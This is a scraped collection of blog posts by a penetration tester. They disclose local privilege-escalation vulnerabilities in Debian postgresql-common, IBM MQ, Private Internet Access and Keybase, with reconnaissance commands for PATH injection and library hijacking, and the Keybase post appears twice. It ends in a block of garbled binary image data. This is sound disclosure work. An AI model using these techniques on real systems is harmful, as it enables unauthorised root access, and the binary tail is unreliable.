It’s important to note this is not a vulnerability in PostgreSQL and is specific to Debian, Ubuntu, or any system that consumes the Debian postgresql-common package.

A [fix](https://salsa.debian.org/postgresql/postgresql-common/commit/ec9d984b62ed79f61be97b786a9ff4381309979c) is now available. Administrators should upgrade to the latest version of the postgresql-common package. See the Debian [security tracker](https://security-tracker.debian.org/tracker/source-package/postgresql-common) for details.

The vulnerability appears to have existed since 2013 based on the Debian Git history ([9dc97b,](https://salsa.debian.org/postgresql/postgresql-common/commit/9dc97be33f1f116ae6e2f17bd05cb6a2baf274a9) [e97d16](https://salsa.debian.org/postgresql/postgresql-common/commit/e97d163c85c6df7e30ecc346eec007da2cd7e688)). I attempted to reproduce it on Wheezy but was unable to verify it due to unrelated technical issues standing up a test environment.

This proof of concept will show the ability to gain root privileges using the default

installation of  postgresql-common v200+deb10u2 along with postgresql-11 on Debian Buster. I have also verified the vulnerability on Ubuntu 19.04 with version 199 of the postgresql-common package.

---

## Walkthrough

The postgresql init script(/etc/init.d/postgresql) sources [init.d-functions](https://salsa.debian.org/postgresql/postgresql-common/blob/master/debian/init.d-functions) which contain functions that call the pg\_ctlcluster script. pg\_ctlcluster loads the following configuration files determined by the [Pgcommon](https://salsa.debian.org/postgresql/postgresql-common/blob/master/PgCommon.pm) module.

* /etc/postgresql/cluster-version/cluster-name/pg\_ctl.conf
* /etc/postgresql/cluster-version/cluster-name/postgresql.conf
* /var/lib/postgresql/cluster-version/cluster-name/postgresql.auto.conf

These files are owned by the postgres user. The postgresql.auto.conf file will override the settings from /etc/postgresql. This file is created when the [alter system](https://www.postgresql.org/docs/current/sql-altersystem.html) command is executed.

pg\_ctlcluster contains logic to create directories for socketdir(defined in pg\_ctl.conf) and stats\_temp\_directory(defined in postgresql.conf). During a start or reload, if the directories defined in either of these variables do not exist, pg\_ctlcluster will create it and set the owner to the postgres user.

[Continue reading →](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/#more-333)

[CVE-2018-1792 – IBM MQ Privilege Escalation: Fun with RUNPATH — August 25, 2019](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/ "CVE-2018-1792 – IBM MQ Privilege Escalation: Fun with RUNPATH")

[![](https://blog.mirch.io/wp-content/uploads/2019/08/mqm-woot-4.png?w=712)](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/ "CVE-2018-1792 – IBM MQ Privilege Escalation: Fun with RUNPATH")

## [CVE-2018-1792 – IBM MQ Privilege Escalation: Fun with RUNPATH](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/)

[August 25, 2019August 25, 2019](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/ "11:37 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")/[Leave a comment](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/#respond)

# Vulnerability Summary

[IBM MQ](https://en.wikipedia.org/wiki/IBM_MQ) for Linux and UNIX systems is vulnerable to a privilege escalation attack by forcing a setuid root binary to load a malicious library. A local attacker with access to the mqm account can execute arbitrary code as root. In October 2018 IBM published an [advisory](https://www-01.ibm.com/support/docview.wss?uid=ibm10734447) along with patches for several versions.

The goal of this post is to show how the [RPATH/RUNPATH](https://en.wikipedia.org/wiki/Rpath) value could potentially be leveraged for privilege escalation. When specified at compile time this path is embedded in the binary and is the first path searched when searching for a library if the dependent library specified does contain a slash. Details on how this works can be found in the [ld.so](http://man7.org/linux/man-pages/man8/ld.so.8.html) man page.

As with most file path type vulnerabilities, if you control the path, you may control the application in some way. In this case the mqm user is the owner of the directories listed in the RUNPATH.

---

## Walkthrough

List setuid root applications.

```
[mqm@localhost]$ find /opt/mqm -perm -4000 -user root|xargs ls -l
-r-sr-x---. 1 root mqm 13384 Jul 9 07:09 /opt/mqm/bin/security/amqoamax
-r-sr-x---. 1 root mqm 13704 Jul 9 07:09 /opt/mqm/bin/security/amqoampx

```

Use [readelf](http://man7.org/linux/man-pages/man1/readelf.1.html) to read the dynamic section to extract the RPATH/RUNPATH.

```
[mqm@localhost ~]$ readelf -d /opt/mqm/bin/security/amqoamax |grep -e RPATH -e RUNPATH
0x000000000000001d (RUNPATH) Library runpath: [/opt/mqm/lib64:/opt/mqm/gskit8/lib64:/

```

Using my favorite utility [strace](http://man7.org/linux/man-pages/man1/strace.1.html), we can see the open() calls for libm.so.6 fails with ENOENT under /opt/mqm/lib64 and /opt/mqm/gskit8.  We’re using libm.so.6 for this PoC but other libraries can be used. The dependency is ultimately resolved at /usr/lib64/libm.so.6. This gets interesting because the mqm user owns the directories under /opt/mqm.

```
[mqm@localhost ~]$ strace -f /opt/mqm/bin/security/amqoamax 2>&1|grep libm.so
open("/opt/mqm/lib64/libm.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
open("/opt/mqm/gskit8/lib64/libm.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
open("/usr/lib64/libm.so.6", O_RDONLY|O_CLOEXEC) = 3

```

[Continue reading →](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/#more-165)

[CVE-2019-12572 PIA Windows Privilege Escalation: Malicious OpenSSL Engine — June 10, 2019](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/ "CVE-2019-12572 PIA Windows Privilege Escalation: Malicious OpenSSL Engine")

[![](https://blog.mirch.io/wp-content/uploads/2019/06/woot-cmd.png?w=659)](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/ "CVE-2019-12572 PIA Windows Privilege Escalation: Malicious OpenSSL Engine")

## [CVE-2019-12572 PIA Windows Privilege Escalation: Malicious OpenSSL Engine](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/)

[June 10, 2019June 20, 2019](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/ "7:13 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")/[1 Comment](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/#comments)

## **Vulnerability Summary**

During startup the PIA Windows service(pia-service.exe) loads the OpenSSL library from C:\Program Files\Private Internet Access\libeay32.dll. This library attempts to load the C:\etc\ssl\openssl.cnf configuration file. By default on Windows systems, authenticated users can create directories under C:\. A low privileged user can create a openssl.cnf configuration file to load a malicious OpenSSL engine library resulting in the arbitrary code execution as SYSTEM when the service starts.

The root cause is when the OpenSSL libraries were built, the [OPENSSLDIR](https://wiki.openssl.org/index.php/Compilation_and_Installation#PREFIX_and_OPENSSLDIR) parameter was set to a path which a low privileged user can modify or create. I believe this issue is lurking in many Window applications that bundle OpenSSL libraries. I have discovered the same vulnerability in several other Windows applications and will be disclosing those findings when patches are available.

I created a simple tool to help identify potentially vulnerable OpenSSL libraries –<https://github.com/mirchr/openssldir_check>.

CVE-2019-12572 has been patched in v1.2.1. The latest Windows desktop client can be upgraded automatically via the application or manually from the download page at [Private Internet Access](https://www.privateinternetaccess.com/pages/download).

---

### **Walkthrough**

While hunting for potential vulnerabilities in the Windows Private Internet Access desktop application I noticed a failed call to open the c:\etc\ssl\openssl.cnf file during the service startup.

![pia-openssl-failed-open](https://blog.mirch.io/wp-content/uploads/2019/06/pia-openssl-failed-open.png)

This caught my attention and I needed to research this further. But before I get into the details of that, let’s take a step back and see how I arrived there.

[Continue reading →](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/#more-259)

## Posts navigation

[Older posts](https://blog.mirch.io/page/2/)

### Tags

[exploit](https://blog.mirch.io/tag/exploit/)
[hacking sudo](https://blog.mirch.io/tag/hacking-sudo/)
[Linux](https://blog.mirch.io/tag/linux/)
[PostgreSQL](https://blog.mirch.io/tag/postgresql/)
[sudo hacking](https://blog.mirch.io/tag/sudo-hacking/)
[vulnerability](https://blog.mirch.io/tag/vulnerability/)
[Follow Rich Mirch on WordPress.com](https://blog.mirch.io)

* [GitHub](https://github.com/mirchr)
* [LinkedIn](https://www.linkedin.com/in/mirchr/)

[Create a website or blog at WordPress.com](https://wordpress.com/?ref=footer_custom_svg "Create a website or blog at WordPress.com")

* Subscribe
  Subscribed

  + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2022%252F05%252F20%252Fexploiting-kaseya-unitrends-backup-appliance-part-1%252F)
* Privacy
* + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2022%252F05%252F20%252Fexploiting-kaseya-unitrends-backup-appliance-part-1%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://blog.mirch.io)
  + [View site in Reader](https://wordpress.com/read/feeds/161645119)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

![](https://pixel.wp.com/b.gif?v=noscript)



=== Content from blog.mirch.io_43aae722_20250126_123158.html ===

[Skip to content](#content)

* [Home](/)
* [Vulnerability Research](https://blog.mirch.io/cve/)
* [Github](https://github.com/mirchr/security-research)
* [Twitter](https://twitter.com/0xm1rch)
* [About](https://blog.mirch.io/about/)

Search for:

[Rich Mirch](https://blog.mirch.io "Rich Mirch")
# [Rich Mirch](https://blog.mirch.io/ "Rich Mirch")

## Penetration Tester, Red Teamer, Security Researcher

Menu

[CVE-2018-18629: Keybase Linux privilege escalation — December 21, 2018](https://blog.mirch.io/2018/12/21/cve-2018-18629-keybase-linux-privilege-escalation/ "CVE-2018-18629: Keybase Linux privilege escalation")

[![](https://blog.mirch.io/wp-content/uploads/2018/12/keybase-woot.png?w=712)](https://blog.mirch.io/2018/12/21/cve-2018-18629-keybase-linux-privilege-escalation/ "CVE-2018-18629: Keybase Linux privilege escalation")

## [CVE-2018-18629: Keybase Linux privilege escalation](https://blog.mirch.io/2018/12/21/cve-2018-18629-keybase-linux-privilege-escalation/)

[December 21, 2018May 3, 2019](https://blog.mirch.io/2018/12/21/cve-2018-18629-keybase-linux-privilege-escalation/ "12:43 pm")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

Recently I started using [Keybase](https://keybase.io/) which is a Slack like application but provides end-to-end encryption. Version 2.8.0.20181017144746.3efc4cbf3c is vulnerable to a privilege escalation vulnerability allowing a low privileged user to execute arbitrary commands as root.

After executing the application using a low privileged account I noticed a process named keybase-redirector running as root. I was interested and wanted to understand how this worked. After checking the file permissions I found that the keybase-redirector was setuid root. I enjoy the challenge of finding vulnerabilities in privileged binaries so I started my research.

One of the first techniques I use when attacking setuid binaries is to test for PATH injections. The PATH environment variable is a colon separated list of directories that is searched when executing a command by name. As a test I reset the PATH environment variable to a unique value while executing keybase-redirector.  Using the env command  inline ensures that the PATH is only set for the execution and the current value of PATH is unmodified.

> [user1@localhost ~]$ env PATH=/foobar /usr/bin/keybase-redirector /keybase
>
> Mount error, exiting cleanly: fusermount: exec: “fusermount”: executable file not found in $PATH

The descriptive error message immediately caught my attention. To confirm the potential vulnerability I executed the [strace(1)](http://man7.org/linux/man-pages/man1/strace.1.html) utility. strace traces system calls and has a variety of options. The common options that I use are -f(follow forks), -s (maximum string size to print) and -u [username]. strace generates verbose output so this is where the unique PATH string becomes useful. We can quickly search the output for that string to find potential injection points. When tracing a setuid binary, strace must be executed from root because privileges are dropped. In some cases the error message may not provide any clues. Regardless of the output I always run strace to verify. As you can see in the below output, the newfstatat() call is checking if /foobar/fusermount exists.

> [root@localhost ~]# env PATH=/foobar /usr/bin/strace -u user1 -f /usr/bin/keybase-redirector /keybase 2>&1|grep foobar
>
> [pid 4890] newfstatat(AT\_FDCWD, “**/foobar/fusermount**“, 0xc420070858, 0) = -1 ENOENT (No such file or directory)

Now that it appears the program trusts the value of PATH we can try to exploit it. I crafted a fusermount binary to create the /w00t file. View the original PoC in the Hackerone report [426944](https://hackerone.com/reports/426944). Since then I created a new PoC to get an interactive root shell. Updated PoC can be found at my Github repo [CVE-2018-18629.sh](https://raw.githubusercontent.com/mirchr/security-research/master/vulnerabilities/CVE-2018-18629.sh)

PoC screenshot for CentOS 7.4.1708.

![keybase-woot](https://blog.mirch.io/wp-content/uploads/2018/12/keybase-woot.png?w=712)

## Summary

Setuid programs should reset the PATH environment variable prior to executing any external binaries. Fully qualified paths can also be used. The response from Keybase was amazing and I really enjoyed the partnership. [@maxtaco](https://twitter.com/maxtaco) committed the fix to the master branch within one hour of receiving the report! I appreciate their transparency and technical write-up in the advisory.

References

* Keybase advisory: [Local Privilege Escalation on Linux via keybase-redirector (KB002)](https://keybase.io/docs/secadv/kb002).
* Hackerone Report: [Linux privilege escalation via trusted $PATH in keybase-redirector](https://hackerone.com/reports/426944).
* BleepingComputer article: [Keybase Pays $5,000 Bounties for Privilege Escalation Bugs in Linux and macOS Apps](https://www.bleepingcomputer.com/news/security/keybase-pays-5-000-bounties-for-privilege-escalation-bugs-in-linux-and-macos-apps/).

### Share this:

* [Twitter](https://blog.mirch.io/2018/12/21/cve-2018-18629-keybase-linux-privilege-escalation/?share=twitter "Click to share on Twitter")
* [Facebook](https://blog.mirch.io/2018/12/21/cve-2018-18629-keybase-linux-privilege-escalation/?share=facebook "Click to share on Facebook")
Like Loading...
### *Related*

Categories: [Linux](https://blog.mirch.io/category/linux/)Tags: [exploit](https://blog.mirch.io/tag/exploit/), [Linux](https://blog.mirch.io/tag/linux/)

## Post navigation

[CVE-2018-19788 PoC – polkit: Improper handling of user with uid > INT\_MAX leading to authentication bypass](https://blog.mirch.io/2018/12/09/cve-2018-19788-poc-polkit-improper-handling-of-user-with-uid-int_max-leading-to-authentication-bypass/)[Linux persistence idea – using group passwords](https://blog.mirch.io/2019/01/09/linux-persistence-idea-using-group-passwords/)

### Tags

[exploit](https://blog.mirch.io/tag/exploit/)
[hacking sudo](https://blog.mirch.io/tag/hacking-sudo/)
[Linux](https://blog.mirch.io/tag/linux/)
[PostgreSQL](https://blog.mirch.io/tag/postgresql/)
[sudo hacking](https://blog.mirch.io/tag/sudo-hacking/)
[vulnerability](https://blog.mirch.io/tag/vulnerability/)
[Follow Rich Mirch on WordPress.com](https://blog.mirch.io)

* [GitHub](https://github.com/mirchr)
* [LinkedIn](https://www.linkedin.com/in/mirchr/)

[Create a website or blog at WordPress.com](https://wordpress.com/?ref=footer_custom_svg "Create a website or blog at WordPress.com")

* Reblog
* Subscribe
  Subscribed

  + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2018%252F12%252F21%252Fcve-2018-18629-keybase-linux-privilege-escalation%252F)
* Privacy
* + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2018%252F12%252F21%252Fcve-2018-18629-keybase-linux-privilege-escalation%252F)
  + [Copy shortlink](https://wp.me/paoR5j-2Y)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://blog.mirch.io/2018/12/21/cve-2018-18629-keybase-linux-privilege-escalation/)
  + [View post in Reader](https://wordpress.com/read/blogs/153687293/posts/184)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

%d

![](https://pixel.wp.com/b.gif?v=noscript)



=== Content from blog.mirch.io_e4e403fa_20250126_123157.html ===

[Skip to content](#content)

* [Home](/)
* [Vulnerability Research](https://blog.mirch.io/cve/)
* [Github](https://github.com/mirchr/security-research)
* [Twitter](https://twitter.com/0xm1rch)
* [About](https://blog.mirch.io/about/)

Search for:

[Rich Mirch](https://blog.mirch.io "Rich Mirch")
# [Rich Mirch](https://blog.mirch.io/ "Rich Mirch")

## Penetration Tester, Red Teamer, Security Researcher

Menu

[CVE-2018-18629: Keybase Linux privilege escalation — December 21, 2018](https://blog.mirch.io/2018/12/21/cve-2018-18629-keybase-linux-privilege-escalation/ "CVE-2018-18629: Keybase Linux privilege escalation")

[![](https://blog.mirch.io/wp-content/uploads/2018/12/keybase-woot.png?w=712)](https://blog.mirch.io/2018/12/21/cve-2018-18629-keybase-linux-privilege-escalation/ "CVE-2018-18629: Keybase Linux privilege escalation")

## [CVE-2018-18629: Keybase Linux privilege escalation](https://blog.mirch.io/2018/12/21/cve-2018-18629-keybase-linux-privilege-escalation/)

[December 21, 2018May 3, 2019](https://blog.mirch.io/2018/12/21/cve-2018-18629-keybase-linux-privilege-escalation/ "12:43 pm")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

Recently I started using [Keybase](https://keybase.io/) which is a Slack like application but provides end-to-end encryption. Version 2.8.0.20181017144746.3efc4cbf3c is vulnerable to a privilege escalation vulnerability allowing a low privileged user to execute arbitrary commands as root.

After executing the application using a low privileged account I noticed a process named keybase-redirector running as root. I was interested and wanted to understand how this worked. After checking the file permissions I found that the keybase-redirector was setuid root. I enjoy the challenge of finding vulnerabilities in privileged binaries so I started my research.

One of the first techniques I use when attacking setuid binaries is to test for PATH injections. The PATH environment variable is a colon separated list of directories that is searched when executing a command by name. As a test I reset the PATH environment variable to a unique value while executing keybase-redirector.  Using the env command  inline ensures that the PATH is only set for the execution and the current value of PATH is unmodified.

> [user1@localhost ~]$ env PATH=/foobar /usr/bin/keybase-redirector /keybase
>
> Mount error, exiting cleanly: fusermount: exec: “fusermount”: executable file not found in $PATH

The descriptive error message immediately caught my attention. To confirm the potential vulnerability I executed the [strace(1)](http://man7.org/linux/man-pages/man1/strace.1.html) utility. strace traces system calls and has a variety of options. The common options that I use are -f(follow forks), -s (maximum string size to print) and -u [username]. strace generates verbose output so this is where the unique PATH string becomes useful. We can quickly search the output for that string to find potential injection points. When tracing a setuid binary, strace must be executed from root because privileges are dropped. In some cases the error message may not provide any clues. Regardless of the output I always run strace to verify. As you can see in the below output, the newfstatat() call is checking if /foobar/fusermount exists.

> [root@localhost ~]# env PATH=/foobar /usr/bin/strace -u user1 -f /usr/bin/keybase-redirector /keybase 2>&1|grep foobar
>
> [pid 4890] newfstatat(AT\_FDCWD, “**/foobar/fusermount**“, 0xc420070858, 0) = -1 ENOENT (No such file or directory)

Now that it appears the program trusts the value of PATH we can try to exploit it. I crafted a fusermount binary to create the /w00t file. View the original PoC in the Hackerone report [426944](https://hackerone.com/reports/426944). Since then I created a new PoC to get an interactive root shell. Updated PoC can be found at my Github repo [CVE-2018-18629.sh](https://raw.githubusercontent.com/mirchr/security-research/master/vulnerabilities/CVE-2018-18629.sh)

PoC screenshot for CentOS 7.4.1708.

![keybase-woot](https://blog.mirch.io/wp-content/uploads/2018/12/keybase-woot.png?w=712)

## Summary

Setuid programs should reset the PATH environment variable prior to executing any external binaries. Fully qualified paths can also be used. The response from Keybase was amazing and I really enjoyed the partnership. [@maxtaco](https://twitter.com/maxtaco) committed the fix to the master branch within one hour of receiving the report! I appreciate their transparency and technical write-up in the advisory.

References

* Keybase advisory: [Local Privilege Escalation on Linux via keybase-redirector (KB002)](https://keybase.io/docs/secadv/kb002).
* Hackerone Report: [Linux privilege escalation via trusted $PATH in keybase-redirector](https://hackerone.com/reports/426944).
* BleepingComputer article: [Keybase Pays $5,000 Bounties for Privilege Escalation Bugs in Linux and macOS Apps](https://www.bleepingcomputer.com/news/security/keybase-pays-5-000-bounties-for-privilege-escalation-bugs-in-linux-and-macos-apps/).

### Share this:

* [Twitter](https://blog.mirch.io/2018/12/21/cve-2018-18629-keybase-linux-privilege-escalation/?share=twitter "Click to share on Twitter")
* [Facebook](https://blog.mirch.io/2018/12/21/cve-2018-18629-keybase-linux-privilege-escalation/?share=facebook "Click to share on Facebook")
Like Loading...
### *Related*

Categories: [Linux](https://blog.mirch.io/category/linux/)Tags: [exploit](https://blog.mirch.io/tag/exploit/), [Linux](https://blog.mirch.io/tag/linux/)

## Post navigation

[CVE-2018-19788 PoC – polkit: Improper handling of user with uid > INT\_MAX leading to authentication bypass](https://blog.mirch.io/2018/12/09/cve-2018-19788-poc-polkit-improper-handling-of-user-with-uid-int_max-leading-to-authentication-bypass/)[Linux persistence idea – using group passwords](https://blog.mirch.io/2019/01/09/linux-persistence-idea-using-group-passwords/)

### Tags

[exploit](https://blog.mirch.io/tag/exploit/)
[hacking sudo](https://blog.mirch.io/tag/hacking-sudo/)
[Linux](https://blog.mirch.io/tag/linux/)
[PostgreSQL](https://blog.mirch.io/tag/postgresql/)
[sudo hacking](https://blog.mirch.io/tag/sudo-hacking/)
[vulnerability](https://blog.mirch.io/tag/vulnerability/)
[Follow Rich Mirch on WordPress.com](https://blog.mirch.io)

* [GitHub](https://github.com/mirchr)
* [LinkedIn](https://www.linkedin.com/in/mirchr/)

[Create a website or blog at WordPress.com](https://wordpress.com/?ref=footer_custom_svg "Create a website or blog at WordPress.com")

* Reblog
* Subscribe
  Subscribed

  + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2018%252F12%252F21%252Fcve-2018-18629-keybase-linux-privilege-escalation%252F)
* Privacy
* + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2018%252F12%252F21%252Fcve-2018-18629-keybase-linux-privilege-escalation%252F)
  + [Copy shortlink](https://wp.me/paoR5j-2Y)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://blog.mirch.io/2018/12/21/cve-2018-18629-keybase-linux-privilege-escalation/)
  + [View post in Reader](https://wordpress.com/read/blogs/153687293/posts/184)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

%d

![](https://pixel.wp.com/b.gif?v=noscript)



=== Content from blog.mirch.io_d2ef43fd_20250126_123157.html ===
RIFFL|  WEBPVP8L@|  /��< \*���Ͽ۶�N��RW�U�x�����QUUuS'��NnU�IEU�3;ޙ�yt��Q渪긃���〉��uUE��:��HQ]�u�y��yno?��w}�Z�Tj�:����`�ې�J$����YQH-���:�<���0�Ѳ�����#zs K/ܓK�V�e`ݟ��s:�N�A�D��X��$��Ћt��qjڀ��3�>f��!X�R8��"
m#P%
"��� ��C��
��8�a(c����C�Z$��L�eX�GT C��:C� c�T$B�a ������0� |d�����\���F.��[��%r���Bp�\_Q%�3�$�H{�D0h�x��2�J�M/�{
�`�Ed �;�|Ξ�'%�A�"> [�ᢾ��3�)8B��CQ#Ў�pg��hY������Ep�K�
x�)�0�:� t
O��E����d���5���N�  L/�D@2�@M�=�T����v]�~���Pރ �Fsg��.�e^?M���G~�J�K�h$]�4�G��8�Fh�4�����=���=r�P��߲��������o�+>s0����$��o~�sS]�4�b���p�Y�w"�ߦ�e�Ud���)�����bڇ�y���o����R7Hpq�$�������~�}���.#�g:��O�>x���o�I�%~!��m��&�o
���p�7��D��}�{O�]�xN�Ƿ\_\*�^����:LY��y�p��ǦI��ΐ��1���`��KE�X�=���nO �O�H|L���n�3�o�x3�
��F�pR���\h�7���3�������������ܜ�阏����B�/�xy��U�~�S��Y��KF�g���p �t(��@'O�g�nH�7E��yvw��p�G������<5���#���j�O$�^���}�K|���/h� �E��pcw�B ��'�� n����-E�-Q4%��  ���w�5�u���=M����~�4�
G��Xv��G��6���>s;H��Q���ڟ}r����g�~������]"e b��E�﯎�������4Hu�}Ļ��M�Q�rk8��țy1~��Ã\��"D���u5�����2�. �g�:�w1������^ԯ\_���Gw�bt�� q� Z
BVg��d�~�O�kS~kJ��F7����ѻ\*�Z�b\_����V���r�W
�|����7:t�)�%kv�y׳ǚ���v�<�~��4�vŲWY�a��?\*�tZ�����" ��ת\_��ϻ�� ��i2�����9��n�UV6!T��{�Q�i\_���=���H�'�ȳ�縹�~@�ϻ�3�}:��x�8<�5{�˓�V���k<=A�SzS$�Ϸ����1f�!�4��Z���:/�X:�@�?P�z���|�q�\*�E�9X��ϽԿL��6�.�JI�d�:�;�:����3�cB���$��~��s�{��\*S�O�k3M�>��q���S���?�1\w�G3�/�����oS��2���K��'���t&\_���m�����7�cNG�Q����D����{�����s�ĞЛ,�7y{��Mlcޫ"~!���w���L����V �����C}��lᇸ>��֝���&�%D�Z��Jy��I�����'hֿl���)��M�{�����i]��] �j��>q����E'|۰2>D%��e�J�)���g(���� ��[�V3�  ��+6i�N"�y�����9ӓ�,�0�+�O)�-z�Y�|b��K'� ���%@jz��� 4��Rɲ,����������V/�`
�=�~�8���>�\*{0��޷PI  �h�����s��F��$ �~u֏m�ۘ������?��K�!@  ������)��m��#�\_�#WA ����Dub`����c��\*�z �E8e@TŜL@�]��\c8d��  Zo>�? H����:�zgW�f�������,� �ŔA�R��m��O)  >��
xf���s %�t��[M� �K��?�tf�! ��[����2� 8W �� d�B�G�b �[��23 |�L J�3��V�Nt����fy���� l�t �e��A�<�x\_\*�����H(\>>[`d�
�Q��v�-���6��s�Zt��<��ek���\*k�n�AH�^��Y'a��� ob���d��б(�+ �a1妠:�����$�b����kq Ez���y��: �d�Kd�[�I�8)�� >.C':)gs�З��@�c�VE t�p���2�[��W����楢\_aE 8TOz��(�^�A�v� �=���;��9�c;p��9�J��H+�)b'� ��EQ�}�#�\_��(�}��$m�� �At�B8�%/q+aN�1��אַ�e99Idz�#���}TF�Z�ҳ���]�r�L#?����S�p��u�ɲDs~�͢5p�J�����<�I��y�� (��"ӿh����.$H��\*�������i���ƆÇH�{���1�� �&��1�E���\_F��&\/�  �M�1�� �L��$�\*& �#Ϲh��m7$FSVq#�b�LM�OH>�b�D�e[O�/��J��{ʔ|�$h�}\_���L�)��u�'p�Y[3 ��A�|��/ �Zh5�k=���k
��PG^Z���9�e���e��bxI�M 1%]�O!�G �j&�m��LC@v�ao" [<��`�$�p�Ͽ��h~�@�� ���Ӿ�^
k����\_�(�f�9&�U���>kZ{�0`$I�����ޏ|�"�1�w�`4�x>�6!AkS��E>��f|���ˠ��yg|yc��0�x,ߋu� ��o��Q�� Ps5Ȼ�!�L ��E���^Rm; �������=>�,�[@�82D�n��yN�m��@�<�qYz�2E�E�  q.][ ~��A��G�IHM��\_/�}(7x�dg r�I ��GP�U���)(�nCH��갭��"��Q0��$�����:��% &9�� ا����>zy�߁㟒�@���qp �lKt��-??(�.iB��(c��"v`B.q]�yQ�Ȓz�\*����YN& 覙����mo�D����.� ����#��^Rk��/\_r�6.���EJ50�W{|j��b<\_�裴�F��[��?�J��b�w���� �r��Z���s�9���Ds�i�������:l�I���;�j�aF�s�g��Os�9��� ��q�ݲ}��\_��C]����'�.R7�o�����`�"LV�3�o�'O��s^@��3s�9k(���D��3�\_H�����S Ҵ-�6���OjMS�H�:�YƮ�us漝��fp��y���#w��:L����omS�2�W<l4�������G��4T�qtw����V�f}h]1�7z{���! �o����3�t��@�Su�  j�}�k5�e��F@[�ͪ��h5X� ]`�� qX5�3��I;M�g��PE�\_��ޝ7�T��2��-���Η;�a��0�s�9�̓Huᄗ�1���J�<���n)�oS�s�վ���l�s�ٗ�Y@�yϿχ<���l<O 
�����+8AU�i�|�"��~�լ[}�g~�m�]�D%�ޥ;�̷�����
G���P�s��7��� 0N z%��\�ޞ��k�
�=��Z+��h\_��IP�4�p����A�q\_����s�Lv7T�@�O+�����;�����
��[��K�`��(Q�
8Y[�D�� �g�sL~�jiE�v=��r�F Q� t�i㘱k��V�#��� �^��M�˗(�� �u� �﵅������S�g,��޴n@�J�
��3-v��= ��Z���?��+?�dً��J|�b��ڑ�<���螡��.�u��h  i�,A
 @D��������%��P�>C'��!:V�k� �@�˪�W�D�
���@���
x�X����
Å��F#��߻�
���\_���w�x3��i��8�c8��������% �K�GVPޓ�
rE/�l2dM~�2�ZS�o���|/�����?�}-�#�z����f�u��z�z�>E�P�tG��z8'�(]�R�.�H���K�hf%�������|D��-�+��7�8//%S��.��d��������N`Ja��5|�'`�
